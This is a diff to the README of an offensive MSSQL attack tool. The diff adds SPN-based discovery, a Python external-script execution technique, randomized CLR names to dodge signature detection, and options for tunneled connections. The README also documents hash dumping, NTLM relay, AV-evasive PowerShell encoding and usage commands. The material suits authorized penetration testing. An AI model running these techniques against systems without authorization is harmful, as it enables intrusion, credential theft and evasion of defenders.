@@ -12,11 +12,13 @@ The MSSQL ATTACK TOOL (M.A.T) is a C# tool for fast discovery and exploitation o
 
 ## Features
 
+- **SPN Discovery** - Discover MSSQL instances in the domain via SPN queries (no server required)
 - **Reconnaissance** - Automatic checks: login info, group memberships, linked servers, impersonation privileges, SQL logins enumeration
-- **Three command execution techniques:**
+- **Four command execution techniques:**
   - `xp_cmdshell` (local + linked servers, single/double/triple link)
   - `sp_OACreate` / OLE Automation Procedures (local + linked servers, blind execution)
-  - CLR Assembly custom stored procedure (local)
+  - CLR Assembly custom stored procedure (local, with OPSEC-safe randomized names)
+  - `sp_execute_external_script` Python external script (local + linked servers)
 - **Windows Integrated, SQL, and Azure AD Authentication**
 - **PowerShell base64 encoding** (`-enc`) for evasion
 - **NTLM relay** via `xp_dirtree` UNC path injection (local + linked servers)
@@ -27,6 +29,10 @@ The MSSQL ATTACK TOOL (M.A.T) is a C# tool for fast discovery and exploitation o
 - **RPC OUT management** - Automatic check and enable for linked server operations
 - **Hash dumping** - Dump MSSQL user hashes (requires sysadmin)
 - **Post-execution cleanup** - Automatically disables enabled features (xp_cmdshell, OLE Automation, CLR) after use (can be skipped with `--no-cleanup`)
+- **Output logging** - Log all output to file with `--output`
+- **Quiet mode** - Suppress banner with `--quiet`
+- **Connection tuning** - Custom port (`--port`) and timeout (`--timeout`) for tunneled/proxied environments
+- **OPSEC improvements** - Randomized CLR assembly/procedure names to avoid static signature detection
 
 ## Compilation
 
@@ -47,7 +53,7 @@ If no `-u` / `-p` is provided, Windows Integrated Authentication is used by defa
 ### Options
 
 ```
-  -s, --server           Required. SQL server hostname or IP
+  -s, --server           SQL server hostname or IP (not required with --spn-scan)
   -u, --user             SQL user (for SQL or Azure authentication)
   -p, --password         SQL password
   -d, --database         Database name (default: 'master')
@@ -60,16 +66,26 @@ If no `-u` / `-p` is provided, Windows Integrated Authentication is used by defa
   --double-link          Execute OS command via double link (value = command)
   --stoprox              Execute OS command via CLR stored procedure (legacy, same as --cmdtech 3)
   --dumphashes           Dump MSSQL user hashes (requires sysadmin)
-  --cmdtech              Execution technique: 1=xp_cmdshell (default), 2=sp_OACreate, 3=CLR assembly
+  --cmdtech              Execution technique: 1=xp_cmdshell (default), 2=sp_OACreate, 3=CLR assembly, 4=External Script
   --encode-ps            Encode command as base64 PowerShell (-enc) for AV evasion
   --azure-domain         Azure AD domain (enables Azure auth, requires -u and -p)
   --no-cleanup           Skip post-execution cleanup (don't disable features after use)
   --linked-query         Execute custom SQL query on linked server via OPENQUERY
+  --spn-scan             Discover MSSQL instances in domain via SPN query (no --server required)
+  --output               Log all output to specified file path
+  --quiet                Suppress banner output
+  --port                 SQL Server port (default: 1433, useful for tunneled connections)
+  --timeout              Connection timeout in seconds (default: 30)
   --help                 Display help screen
   --version              Display version information
 ```
 
 ## Examples
+
+### SPN Discovery (find MSSQL instances in domain)
+```
+MAT.exe --spn-scan
+```
 
 ### Basic recon (Windows auth)
 ```
@@ -101,6 +117,16 @@ MAT.exe --server localhost --os-command "whoami" --cmdtech 2
 MAT.exe --server localhost --os-command "whoami" --cmdtech 3
 # or legacy syntax:
 MAT.exe --server localhost --stoprox "whoami"
+```
+
+### OS command via External Script (sp_execute_external_script)
+```
+MAT.exe --server localhost --os-command "whoami" --cmdtech 4
+```
+
+### External Script on linked server
+```
+MAT.exe --server localhost -l LINKED01 --os-command "whoami" --cmdtech 4
 ```
 
 ### Command with PowerShell base64 encoding
@@ -163,13 +189,29 @@ MAT.exe --server localhost --os-command "whoami" --no-cleanup
 MAT.exe --server localhost --dumphashes
 ```
 
+### Log output to file
+```
+MAT.exe --server localhost --os-command "whoami" --output C:\temp\mat_output.txt
+```
+
+### Custom port (e.g., through chisel tunnel)
+```
+MAT.exe --server 127.0.0.1 --port 41433 --timeout 60 --os-command "whoami"
+```
+
+### Quiet mode (suppress banner)
+```
+MAT.exe --server localhost --os-command "whoami" --quiet
+```
+
 ## Command Execution Techniques
 
 | Technique | `--cmdtech` | Output | Local | Linked | Description |
 |-----------|:-----------:|:------:|:-----:|:------:|-------------|
 | xp_cmdshell | 1 (default) | Yes | Yes | Yes | Standard, returns command output |
 | sp_OACreate | 2 | No (blind) | Yes | Yes | OLE Automation, no output returned |
-| CLR Assembly | 3 | Yes | Yes | No | Custom .NET stored procedure |
+| CLR Assembly | 3 | Yes | Yes | No | Custom .NET stored procedure, randomized names |
+| External Script | 4 | Yes | Yes | Yes | Python via sp_execute_external_script |
 
 ## Scenario Walkthrough
 
@@ -212,6 +254,7 @@ The tool supports multi-hop scenarios (1-hop, 2-hop, 3-hop) through linked serve
 
 - Original MAT: [SySS-Research](https://github.com/SySS-Research/MAT) (Marvin Ramsperger, SySS GmbH)
 - SharpSQLPwn techniques: [lefayjey](https://github.com/lefayjey/SharpSQLPwn)
+- SharpSQL SPN Discovery: [mlcsec](https://github.com/mlcsec/SharpSQL)
 - Integration: [johto89](https://github.com/johto89)
 
 ## License
